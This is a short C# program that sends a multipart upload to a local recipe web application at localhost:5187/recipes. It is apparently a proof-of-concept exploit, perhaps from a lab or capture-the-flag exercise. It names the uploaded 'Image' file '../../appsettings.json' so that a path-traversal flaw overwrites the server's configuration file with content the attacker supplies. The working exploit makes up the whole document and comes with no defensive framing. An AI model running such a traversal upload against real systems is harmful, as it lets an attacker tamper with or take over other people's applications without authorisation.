using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        await RelaceAppsettings();
    }

    static async Task RelaceAppsettings()
    {

        // replacing the appsettings.js
        var url = "http://localhost:5187/recipes";
        var boundary = "----------------------------068545562005799140548789";
        using var httpClient = new HttpClient();
        using var content = new MultipartFormDataContent(boundary);
        content.Headers.Remove("Content-Type");
        content.Headers.TryAddWithoutValidation("Content-Type", "multipart/form-data; boundary=" + boundary);

        // Adding file content
        var filePath = "../../appsettings.json";  // Adjust the file path as necessary
        var real_filePath = "files/appsettings.json";  // Adjust the file path as necessary
        var fileContent = new ByteArrayContent(File.ReadAllBytes(real_filePath));
        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
        content.Add(fileContent, "Image", filePath);

        // Adding simple string content
        content.Add(new StringContent("test"), "Instructions");
        content.Add(new StringContent("test"), "Name");

        try
        {
            var response = await httpClient.PostAsync(url, content);
            if (response.IsSuccessStatusCode)
            {
                var responseContent = await response.Content.ReadAsStringAsync();
                Console.WriteLine("Success: " + responseContent);
            }
            else
            {
                Console.WriteLine("Failed: " + response.StatusCode);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }


}
